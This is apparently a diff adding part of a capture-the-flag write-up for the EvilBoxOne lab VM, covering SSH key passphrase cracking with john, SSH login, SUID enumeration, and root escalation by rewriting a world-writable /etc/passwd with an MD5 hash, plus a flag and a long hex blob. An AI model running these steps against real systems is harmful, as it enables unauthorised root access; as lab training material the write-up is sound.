@@ -372,3 +372,125 @@ Let's hope Matrix: Resurrections rocks!
 
 scann web directory --> analysis php file --> LFI --> upload webshell --> get revers shell --> privilege escalation
 
+23293c8433cc9172cb0666bfcc7559d85a6543e6911d0326ca05f046ff156ed82477efc0512b3949922caa4635d02e814c543cf7237d11a636e97d842cd839b633b31bdbac0d416e1f7fba9edf42bf231ae6ecc7e424fcee7909528bde081d768fbe5e2fc82a0f2d6f3d273b0d0ecbc6f0f86b9164693c8c29cca76d30fc106e43eee3292a80a91861199595f5fca1e8acdc2d610a3aafa772ed87440323eed286b15be70d27d2a7c34f8a34dd4d4fba7da2a9d23833e8836541784b4043df103fce9f9df7c3671a546a32624af92b66a912089370d1464bccc710a6d768360e8b515204f6fa681a6779eae797aacd7461d14d4fe507e13be57c5b36d5ce13faf9132daa05b52f4880801e029d322e77a0e95d0b51f65ffff5a96b5dafb89d67035b61a82a3963c4e28d2bc8d7b39f129d2eb62ebbdc3595689198ea97c5e2ef12f45db124d20b6922d2ed5fbc401cb153559b78507e9cb0e730ab9bef2401a1ebd43f8a4cf95e6c90fb00f0404403ccd78e8fdcc1875fb5ceb766b749bb848e569c825a904336bea0aa96e379084b38bbca7589afa678bd095652e86df9d48318b74339bd485da989f41d78f554e065c684838151fdf86edb348842037feab1d82a70c6801ed6d3262279597d1dac2959487872017c7abf84f7f63c7bd4d1ca73ecccdf637eb1f6e7d9739307d890d3f172911002774b4a4ca653ff65c5e344b3a5112417794436caf6fad66fb3a61834423587d77d609da048855223d672e74da8bdf7ebd87707bcfbc9c9ab8fd65e190df954d85e77444f61f47c5353140a9b9361c6cbafbaa92ff843a0d55714c7769e038364119d14e3a7be1d435359ee3bae72f5bb0c1144f822bcd1d92bafdc85cb26d552a0701eb9a64151462e44b623ff243958c88c52a4190e2b35158a568a3f1da46823f7f61bab5b12239572550c4fc8aeb4083c4b854
+
+┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
+└─$ john hash1 --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
+Cost 2 (iteration count) is 2 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+unicorn          (hash)
+1g 0:00:00:00 DONE (2023-11-12 22:59) 100.0g/s 124200p/s 124200c/s 124200C/s unicorn
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+Now, we can login ssh with id_rsa.
+
+### 4. login ssh
+
+```shell
+┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
+└─$ ssh mowree@172.16.86.147 -i hash
+Enter passphrase for key 'hash':
+Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
+mowree@EvilBoxOne:~$ id
+uid=1000(mowree) gid=1000(mowree) groups=1000(mowree),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
+```
+
+## 4. Privilege Escalation
+
+Now we have normal username and can login ssh, we need to be root.
+
+Find some application with root privilege:
+
+```shell
+mowree@EvilBoxOne:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
+-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
+-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
+-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
+-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
+-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
+```
+
+We has not found somenthing special. Return `/etc/passwd`:
+
+```shell
+mowree@EvilBoxOne:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+mowree@EvilBoxOne:~$ ls -la /etc/passwd
+-rw-rw-rw- 1 root root 1398 Aug 16  2021 /etc/passwd
+```
+
+Everyone can modify the `/etc/passwd`, 
+
+So we can consider remove root's passwd, just remove `x` character. But it doesn't work.
+
+Ok, change the root's passwd. Because the root's passwd is stored in `/etc/shadow` file, so here is `x` . We can just change `x` to password's MD5 hash,and then can change root's password.
+
+```shell
+mowree@EvilBoxOne:~$ openssl passwd -1
+Password:								--> root's passwd is root
+Verifying - Password:		--> root
+$1$BVZFyXa8$KD/LR0zYZNZ1w5gurJUy4/
+```
+
+Change the root's passwd:
+
+```shell
+mowree@EvilBoxOne:~$ vi /etc/passwd
+mowree@EvilBoxOne:~$ su
+Password:
+root@EvilBoxOne:/home/mowree# id
+uid=0(root) gid=0(root) groups=0(root)
+root@EvilBoxOne:/home/mowree# ls -la /root
+total 24
+drwx------  3 root root 4096 Aug 16  2021 .
+drwxr-xr-x 18 root root 4096 Aug 16  2021 ..
+lrwxrwxrwx  1 root root    9 Aug 16  2021 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3526 Aug 16  2021 .bashrc
+drwxr-xr-x  3 root root 4096 Aug 16  2021 .local
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-r--------  1 root root   31 Aug 16  2021 root.txt
+root@EvilBoxOne:/home/mowree# cat /root/root.txt
+36QtXfdJWvdC0VavlPIApUbDlqTsBM
+```
+
+So, that;s all.
+
+## Notes
+
+
